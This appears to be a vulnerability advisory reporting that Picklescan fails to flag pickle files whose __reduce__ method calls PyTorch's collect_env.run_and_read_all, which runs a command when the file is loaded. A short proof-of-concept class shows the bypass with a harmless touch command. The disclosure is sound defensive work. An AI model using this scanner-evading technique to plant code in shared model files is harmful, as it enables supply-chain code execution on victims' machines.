### Summary

Using torch.utils.collect_env.run_and_read_all function, which is a pytorch library function to execute remote pickle file.

### Details

The attack payload executes in the following steps:

First, the attacker craft the payload by calling to torch.utils.collect_env.run_and_read_all function in reduce method
Then when the victim after checking whether the pickle file is safe by using Picklescan library and this library doesn't dectect any dangerous functions, decide to pickle.load() this malicious pickle file, thus lead to remote code execution.

### PoC

```
import torch.utils.collect_env as collect_env

class EvilTorchUtilsCollectEnvRunAndReadAll:
    def __reduce__(self):
        command = 'touch /tmp/collect_env.run_and_read_all_success'
        return collect_env.run_and_read_all, (collect_env.run, command)
```

### Impact

Who is impacted? Any organization or individual relying on picklescan to detect malicious pickle files inside PyTorch models.
What is the impact? Attackers can embed malicious code in pickle file that remains undetected but executes when the pickle file is loaded.
Supply Chain Attack: Attackers can distribute infected pickle files across ML models, APIs, or saved Python objects.

### Corresponding

https://github.com/FredericDT
https://github.com/Qhaoduoyu

